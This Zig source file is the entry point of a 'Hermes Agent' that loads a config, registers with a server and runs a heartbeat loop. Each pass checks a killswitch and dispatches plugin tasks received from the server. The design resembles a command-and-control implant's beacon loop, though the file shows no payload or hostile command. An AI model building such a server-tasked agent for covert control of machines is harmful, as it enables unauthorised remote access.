//! Hermes Agent Entry Point
//! Initializes logger, loads configuration, connects to server,
//! registers, and runs the heartbeat loop with killswitch checks.

const std = @import("std");
const config = @import("config/parser.zig");
const logger = @import("utils/logger.zig");
const network = @import("network/client.zig");
const dispatcher = @import("dispatcher.zig");
const killswitch = @import("utils/killswitch.zig");

pub fn main() !void {
    // Initialize the logger (Step 5)
    try logger.init();
    defer logger.deinit();

    // Load configuration (Step 4)
    const cfg = try config.load("config/default.json");
    logger.info("Configuration loaded: server={s}:{d}", .{ cfg.server_ip, cfg.server_port });

    // Create and connect the network client (Step 6)
    var client = try network.Client.init(cfg);
    try client.connect();
    logger.info("Connected to server", .{});

    // Register with the server (Step 7)
    try client.register();
    logger.info("Agent registered with ID {s}", .{client.agent_id});

    // Main loop: heartbeat and killswitch check (Steps 8, 9, 10)
    while (true) {
        // Check killswitch file (Step 10)
        killswitch.check();

        // Send heartbeat and receive any pending task (Step 8)
        const task = try client.heartbeat();
        if (task) |t| {
            logger.info("Received task: {s}", .{t.plugin});
            // Dispatch the task (Step 9)
            try dispatcher.dispatch(&client, t);
        }

        // Sleep for heartbeat interval
        std.time.sleep(cfg.heartbeat_interval * std.time.ns_per_s);
    }
}
